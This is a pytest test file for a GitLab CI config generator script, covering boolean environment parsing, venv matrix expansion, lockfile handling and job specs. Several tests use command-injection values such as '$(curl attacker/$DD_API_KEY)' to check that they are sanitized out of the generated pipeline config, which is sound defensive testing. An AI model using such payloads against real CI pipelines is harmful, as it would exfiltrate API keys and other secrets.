"""Tests for scripts/gen_gitlab_config.py."""

import importlib.util
import pathlib
import sys
import types
from unittest import mock

import pytest

from scripts._testenv import prepare_environment


_SCRIPT_PATH = pathlib.Path(__file__).resolve().parents[2] / "scripts" / "gen_gitlab_config.py"


@pytest.fixture(scope="module")
def gen_gitlab_config_mod():
    # The script is not importable as-is: it runs under uv with its own dependencies, parses argv at
    # import time, and appends to sys.path. Stub ruamel.yaml, give it an empty argv, and restore
    # sys.path afterwards so the rest of the suite is unaffected.
    ruamel = types.ModuleType("ruamel")
    yaml = types.ModuleType("ruamel.yaml")

    class YAML:
        def __enter__(self):
            return self

        def __exit__(self, *_args):
            return None

        def load(self, content):
            return {"variables": {"TESTRUNNER_IMAGE": "testrunner:fake"}}

    yaml.YAML = YAML
    ruamel.yaml = yaml

    spec = importlib.util.spec_from_file_location("gen_gitlab_config", _SCRIPT_PATH)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    original_path = list(sys.path)
    with mock.patch.dict(sys.modules, {"ruamel": ruamel, "ruamel.yaml": yaml, spec.name: module}):
        with mock.patch.object(sys, "argv", [str(_SCRIPT_PATH)]):
            spec.loader.exec_module(module)
        try:
            yield module
        finally:
            sys.path[:] = original_path


@pytest.mark.parametrize(
    "value, expected",
    [
        (None, "false"),
        ("", "false"),
        ("false", "false"),
        ("true", "true"),
        ("TRUE", "true"),
        (" true", "false"),
        ("$(curl attacker/$DD_API_KEY)", "false"),
        ('true" && curl attacker/$DD_API_KEY #', "false"),
    ],
)
def test_get_bool_env_only_allows_literal_true(gen_gitlab_config_mod, monkeypatch, value, expected):
    monkeypatch.delenv("NIGHTLY_BUILD", raising=False)
    if value is not None:
        monkeypatch.setenv("NIGHTLY_BUILD", value)

    assert gen_gitlab_config_mod._get_bool_env("NIGHTLY_BUILD") == expected


def test_jobspec_sanitizes_nightly_build_before_script(gen_gitlab_config_mod, monkeypatch):
    monkeypatch.setenv("NIGHTLY_BUILD", "$(curl attacker/$DD_API_KEY)")

    config = str(gen_gitlab_config_mod.JobSpec(name="suite", stage="core"))

    assert '    - export NIGHTLY_BUILD="false"' in config
    assert "$(curl" not in config
    assert "$DD_API_KEY" not in config


def test_build_base_venvs_template_gets_sanitized_bool_values(gen_gitlab_config_mod, monkeypatch, tmp_path):
    monkeypatch.setenv("NIGHTLY_BUILD", "$(curl attacker/$DD_API_KEY)")
    monkeypatch.setenv("UNPIN_DEPENDENCIES", "$(curl attacker/$DD_API_KEY)")
    monkeypatch.setattr(gen_gitlab_config_mod, "TESTS_GEN", tmp_path / "tests-gen.yml")
    monkeypatch.setattr(gen_gitlab_config_mod, "_global_python_versions", {"3.11"})

    gen_gitlab_config_mod.gen_build_base_venvs()

    config = (tmp_path / "tests-gen.yml").read_text()
    assert 'echo "NIGHTLY_BUILD: false"' in config
    assert 'echo "UNPIN_DEPENDENCIES: false"' in config
    assert 'if [[ "false" == "true" ]]' in config
    assert "$(curl" not in config
    assert "$DD_API_KEY" not in config


def test_docs_only_pipeline_includes_required_base_environment(gen_gitlab_config_mod, monkeypatch, tmp_path):
    needs_testrun = types.ModuleType("needs_testrun")
    needs_testrun.pr_matches_patterns = lambda _patterns: True
    monkeypatch.setitem(sys.modules, "needs_testrun", needs_testrun)
    monkeypatch.setattr(gen_gitlab_config_mod, "TESTS_GEN", tmp_path / "tests-gen.yml")
    monkeypatch.setattr(gen_gitlab_config_mod, "_global_python_versions", set())
    monkeypatch.setattr(gen_gitlab_config_mod, "_needs_base_venvs", False)

    gen_gitlab_config_mod.gen_build_docs()
    gen_gitlab_config_mod.gen_build_base_venvs()

    config = (tmp_path / "tests-gen.yml").read_text()
    assert "build_docs:" in config
    assert "build_base_venvs:" in config
    assert 'PYTHON_VERSION: ["3.10"]' in config


def test_collect_all_suite_venv_info_expands_declarative_matrix(gen_gitlab_config_mod):
    suite = {
        "matrix": {
            "command": "pytest tests/contrib/requests",
            "dependencies": ["pytest"],
            "python": ["3.11", "3.12"],
        },
    }
    info = gen_gitlab_config_mod.collect_all_suite_venv_info({"contrib::requests": suite})

    assert info["contrib::requests"].venv_count == 2
    assert info["contrib::requests"].python_versions == {"3.11", "3.12"}


def test_lock_path_tracks_resolver_inputs(gen_gitlab_config_mod):
    from tests import suitespec

    matrix = {"python": ["3.12"], "command": "pytest", "dependencies": ["pytest==8.4.2"]}
    original = suitespec.expand_suite_matrix("example", {"matrix": matrix})[0]

    matrix["dependencies"] = ["pytest==9.0.2"]
    changed = suitespec.expand_suite_matrix("example", {"matrix": matrix})[0]

    assert original.id == changed.id
    assert original.lockfile != changed.lockfile


def test_cache_identity_does_not_change_generated_parallelism(gen_gitlab_config_mod, tmp_path):
    suite = {
        "venvs_per_job": 2,
        "matrix": {
            "command": "pytest tests/contrib/requests",
            "dependencies": ["pytest"],
            "python": ["3.11", "3.12"],
        },
    }
    before = gen_gitlab_config_mod.collect_all_suite_venv_info({"contrib::requests": suite})["contrib::requests"]
    lockfile = tmp_path / "requests.txt"
    lockfile.write_text("requests==2.31.0\n")
    first = prepare_environment(
        tmp_path,
        suite="contrib::requests",
        environment_id="requests-py311",
        lockfile=lockfile.relative_to(tmp_path),
        install_project=False,
    )
    lockfile.write_text("requests==2.32.0\n")
    second = prepare_environment(
        tmp_path,
        suite="contrib::requests",
        environment_id="requests-py311",
        lockfile=lockfile.relative_to(tmp_path),
        install_project=False,
    )
    after = gen_gitlab_config_mod.collect_all_suite_venv_info({"contrib::requests": suite})["contrib::requests"]

    assert first.path != second.path
    assert before == after
    assert gen_gitlab_config_mod.calculate_parallelism_from_venvs(before.venv_count, 2) == (
        gen_gitlab_config_mod.calculate_parallelism_from_venvs(after.venv_count, 2)
    )


def test_jobs_use_uv_locks_and_base_venv_artifacts(gen_gitlab_config_mod):
    config = str(
        gen_gitlab_config_mod.JobSpec(
            name="requests",
            suite="contrib::requests",
            stage="contrib",
            snapshot=True,
            services=["httpbin"],
            python_versions={"3.12"},
        )
    )

    assert "extends: .test_base_snapshot" in config
    assert "TEST_SUITE: contrib::requests" in config
    assert 'UV_NO_CACHE: "1"' in config
    assert "uv run --no-project --python 3.9" in config
    assert "--with-requirements .uv/wait--wait-py39-*.txt" in config
    assert 'DD_TRACE_AGENT_URL="http://testagent:9126" AGENT_VERSION="testagent"' in config
    assert "    - job: build_base_venvs" in config
    assert "      artifacts: true" in config
    assert '          - PYTHON_VERSION: "3.12"' in config
